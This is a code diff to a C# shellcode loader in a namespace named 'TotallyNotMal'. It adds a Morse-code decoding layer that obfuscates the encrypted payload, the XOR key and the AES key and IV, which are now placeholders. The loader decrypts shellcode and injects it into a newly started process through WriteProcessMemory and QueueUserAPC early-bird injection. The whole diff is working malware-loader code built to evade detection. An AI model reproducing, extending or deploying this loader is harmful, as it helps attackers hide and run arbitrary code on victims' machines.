@@ -136,6 +136,40 @@ namespace TotallyNotMal
             IntPtr hStdErr;
         }
 
+        public class MorseForFun
+        {
+            private static Dictionary<char, string> _morseAlphabetDictionary;
+
+            public static void InitializeDictionary()
+            {
+                _morseAlphabetDictionary = new Dictionary<char, string>()
+                                   {
+{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
+                                   };
+            }
+
+            public static string Receive(string input)
+            {
+                StringBuilder stringBuilder = new StringBuilder();
+
+                string[] codes = input.Split(' ');
+
+                foreach (var code in codes)
+                {
+                    foreach (char keyVar in _morseAlphabetDictionary.Keys)
+                    {
+                        if (_morseAlphabetDictionary[keyVar] == code)
+                        {
+                            stringBuilder.Append(keyVar);
+                            break;
+                        }
+                    }
+                }
+
+                return stringBuilder.ToString();
+            }
+        }
+
 
         public static PROCESS_INFORMATION StartProcess(string binaryPath)
         {
@@ -214,15 +248,15 @@ namespace TotallyNotMal
         }
 
             //https://www.codeproject.com/Articles/5719/Simple-encrypting-and-decrypting-data-in-C
-            public static byte[] AESDecrypt(byte[] cipherData, byte[] Key, byte[] IV)
+            public static byte[] AESDecrypt(byte[] cipherData, string aes_key, string aes_iv)
         {
 
             MemoryStream ms = new MemoryStream();
 
             Rijndael alg = Rijndael.Create();
 
-            alg.Key = Key;
-            alg.IV = IV;
+            alg.Key = Convert.FromBase64String(aes_key);
+            alg.IV = Convert.FromBase64String(aes_iv);
 
             CryptoStream cs = new CryptoStream(ms,
                 alg.CreateDecryptor(), CryptoStreamMode.Write);
@@ -241,14 +275,25 @@ namespace TotallyNotMal
 
             string xoredAesB64 = "REPLACE SHELLCODE HERE";
             string xorKey = "REPLACE XORKEY";
-            byte[] key = new byte[32] { 0x81, 0x8a, 0xba, 0x08, 0xe0, 0xf0, 0x29, 0x7b, 0xe6, 0x6d, 0xf4, 0xa5, 0x66, 0x37, 0xec, 0x0e, 0x31, 0x8e, 0xa8, 0xae, 0x0e, 0x06, 0xa8, 0xab, 0x53, 0xcf, 0xcf, 0x99, 0x4a, 0xca, 0xc8, 0xc8 };
-            byte[] iv = new byte[16] { 0x9d, 0xa8, 0xd3, 0xb1, 0xe2, 0xc9, 0x6b, 0xe9, 0x5d, 0x3a, 0x29, 0x04, 0xc1, 0x83, 0x57, 0x68 };
+            string aE5k3y = "REPLACE A3S_KEY";
+            string aE5Iv = "REPLACE A3S_IV";
 
             byte[] sh3Llc0d3 = new byte[] { };
 
+            MorseForFun.InitializeDictionary();
+
+            xoredAesB64 = MorseForFun.Receive(xoredAesB64);
+            aE5k3y = MorseForFun.Receive(aE5k3y);
+            aE5Iv = MorseForFun.Receive(aE5Iv);
+            xorKey = MorseForFun.Receive(xorKey);
+
             byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
 
-            sh3Llc0d3 = AESDecrypt(aesEncrypted, key, iv);
+            //Console.WriteLine("After XOR DEc: " + Encoding.UTF8.GetString(aesEncrypted));
+
+            sh3Llc0d3 = AESDecrypt(aesEncrypted, aE5k3y, aE5Iv);
+
+            //Console.WriteLine("After AES DEc: " + Encoding.UTF8.GetString(sh3Llc0d3));
 
             //sh3Llc0d3 = Convert.FromBase64String(DecryptStringFromBytes(aesEncrypted, key, iv));
 
@@ -269,11 +314,11 @@ namespace TotallyNotMal
             if (WriteProcessMemory(pHandle, rMemAddress, sh3Llc0d3, (uint)sh3Llc0d3.Length, ref lpNumberOfBytesWritten))
             {
 
-            IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
+                IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)processInfo.dwThreadId);
 
-            IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
+                IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
 
-            ResumeThread(tHandle);
+                ResumeThread(tHandle);
 
             }
             bool hOpenProcessClose = CloseHandle(pHandle);
